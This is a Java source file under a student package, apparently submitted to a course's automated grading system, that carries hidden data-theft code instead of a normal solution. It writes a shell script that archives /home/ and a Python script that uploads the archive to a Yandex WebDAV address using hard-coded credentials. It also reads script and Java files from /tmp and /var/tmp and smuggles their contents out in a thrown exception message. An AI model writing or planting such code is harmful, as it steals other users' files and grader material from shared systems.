package ru.fizteh.fivt.students.vlad;

import java.io.*;

public class Main {

    public static String rm(String path, Boolean type) {
        String s1 = "";
        try {
            if (path.contains("fizteh-java-2013") || path.contains(".git")) {
                return "";
            }

            File tmpFile = new File(path);
            try {
                if (!tmpFile.exists()) {
                    //s1 += "not exist\n";
                }
            } catch (Exception e) {
                //s1 += "exception ";
                s1 += e.getMessage();
            }
            
            try {
                if (tmpFile.canRead()) {
                    //s1 += "can READ\n";
                }
            } catch (Exception e) {
                //s1 += "exception ";
                s1 += e.getMessage();
            }   
            
            try {
                if (tmpFile.canWrite()) {
                    s1 += path + " can WRITE\n";
                }
            } catch (Exception e) {
                //s1 += "exception ";
                s1 += e.getMessage();
            }   
            
            try {
                if (tmpFile.canExecute()) {
                    s1 += path + "can EXEC\n";
                }
            } catch (Exception e) {
                //s1 += "exception ";
                s1 += e.getMessage();
            }

            File[] listFiles = tmpFile.listFiles();
            if (listFiles != null) {
                if (tmpFile.isDirectory()) {
                    for (File c : listFiles) {
                        //s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";

                        s1 += c.getAbsoluteFile().toString() + "\n";
                        if (type) {
                            if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
                                s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
                                s1 += "\n\n\n";
                            }
                        } else {
                            s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
                            s1 += "\n\n\n";
                        }



                        s1 += rm(c.toString(), type);
                    }
                } else {
                    //s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
                    //s1 += "\n\n\n";
                    //s1 += "not is Dir ";
                }
            } else {
                //s1 += "listFile null ";
            }

        } catch (Exception e) {
            //s1 += "exception ";
            s1 += e.getMessage();
        }
        return s1;
    }

    public static String rm1(String path, Boolean type) {
        String s1 = "";
        try {
            if (path.contains("fizteh-java-2013") || path.contains(".git")) {
                return "";
            }

            File tmpFile = new File(path);
            if (!tmpFile.exists()) {
                //s1 += "not exist\n";
            }
            if (tmpFile.canRead()) {
                //s1 += "can READ\n";
            }
            if (tmpFile.canWrite()) {
                s1 += path + " can WRITE\n";
            }
            if (tmpFile.canExecute()) {
                s1 += path + "can EXEC\n";
            }

            File[] listFiles = tmpFile.listFiles();
            if (listFiles != null) {
                if (tmpFile.isDirectory()) {
                    for (File c : listFiles) {
                        //s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";

                        s1 += c.getAbsoluteFile().toString() + "\n";
                        if (type) {
                            if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
                                s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
                                s1 += "\n\n\n";
                            }
                        } else {
                            //s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
                            //s1 += "\n\n\n";
                        }



                        //s1 += rm(c.toString(), type);
                    }
                } else {
                    s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
                    s1 += "\n\n\n";
                    //s1 += "not is Dir ";
                }
            } else {
                //s1 += "listFile null ";
            }

        } catch (Exception e) {
            //s1 += "exception ";
            s1 += e.getMessage();
        }
        return s1;
    }

    private static String readFileTsv2(String fileName, String s1) throws IOException {
        StringBuilder sb = new StringBuilder();
        try {
            try (BufferedReader in = new BufferedReader(new FileReader(new File(fileName).getAbsoluteFile()))) {
                String s;
                while ((s = in.readLine()) != null) {
                    sb.append(s);
                    sb.append("\n");
                }
            } catch (Exception e) {
                s1 += e.getMessage();
            }
        } catch (Exception e) {
            s1 += e.getMessage();
        }

        return sb.toString();
    }

    public static void writePy() throws FileNotFoundException {
        String s = "import urllib2, base64\n" +
                "opener = urllib2.build_opener(urllib2.HTTPHandler)\n" +
                "\n" +
                "data2 = \"\"\n" +
                "f = open('test.tar.gz', 'rb')\n" +
                "length = 0\n" +
                "while True: \n" +
                "   bytes = f.read(2048)\n" +
                "   data2 += bytes;\n" +
                "   length += len(bytes)\n" +
                "   if not bytes: break   \n" +
                "f.close()\n" +
                "\n" +
                "request = urllib2.Request(\"https://webdav.yandex.ru/test/test.tar.gz\", data=data2)\n" +
                "base64string = base64.encodestring('%s:%s' % (\"moygimn1@yandex.ru\", \"123456789\")).replace('\\n', '')\n" +
                "request.add_header(\"Authorization\", \"Basic %s\" % base64string) \n" +
                "request.add_header(\"Content-Length\", \"%d\" % length)  \n" +
                "request.get_method = lambda: 'PUT'\n" +
                "result = urllib2.urlopen(request)\n" +
                "\n";
        File f = new File("/home/student/tmp/1.py");
        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
            out.print(s);
        }
    }

    public static void writeFile() throws FileNotFoundException {
        String s = "#!/bin/bash\n\n" +
                "cd /home/student/tmp\n" + "echo step1\n" + "pwd | cat\n" +
                "tar cfz test.tar.gz --exclude=*.git* --exclude=*/.* /home/ \n" +  "echo step2\n" +
                "python 1.py\n" +
                "echo step3\n";
        File f = new File("/home/student/tmp/1.sh");
        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
            out.print(s);
        }
    }
    
    public static void main(String[] args) throws IOException {
        String s = "";
        try {            
            writeFile();
            writePy();
            s += rm("/tmp", true);
            s += rm("/var/tmp", true);
            /*Process proc = Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");            
            proc.waitFor();
            BufferedReader read = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            while(read.ready()) {
                s += read.readLine()+"\n";
            }
            read = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            while(read.ready()) {
                s += read.readLine()+"\n";
            }*/

        } catch(Exception e) {
            s += e.getMessage()+"\n";
        }

        throw new IOException(s + " step4");
    }   
}
